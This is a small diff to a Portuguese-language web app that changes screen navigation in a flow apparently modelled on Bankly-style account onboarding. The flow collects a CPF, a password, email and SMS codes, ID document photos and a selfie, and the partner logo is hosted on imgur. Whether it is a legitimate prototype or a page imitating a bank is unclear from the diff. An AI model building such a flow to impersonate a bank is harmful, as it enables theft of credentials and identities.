@@ -833,7 +833,7 @@
         <input class="input-field" id="cpf-input" type="text" inputmode="numeric" placeholder="000.000.000-00" maxlength="14" oninput="fmtCPF(this)" />
       </div>
       <div class="screen-footer no-border">
-        <button class="btn-primary" id="btn-acessar" disabled onclick="goTo('s-login-senha')">Acessar</button>
+        <button class="btn-primary" id="btn-acessar" disabled onclick="goTo('s-dados')">Acessar</button>
         <div class="app-footer"><img src="https://i.imgur.com/yrhadmn.png" alt="Parceiros" style="width:100%;max-width:280px;"></div>
       </div>
     </div>
@@ -1928,7 +1928,7 @@ function togglePw(inputId, btn) {
 
 // ─── Atalhos de teclado = avança / - retrocede ───────────────────
 const screenOrder = [
-  's-login','s-cpf-cadastrado','s-login-senha','s-dados','s-otp-email',
+  's-login','s-login-senha','s-dados','s-otp-email',
   's-otp-email-erro','s-otp-sms','s-validacao-doc','s-permissao-cam',
   's-cam-frente','s-foto-preview','s-cam-verso','s-foto-verso-preview',
   's-selfie-intro','s-bankly-verify','s-bankly-loading','s-bankly-pronto',
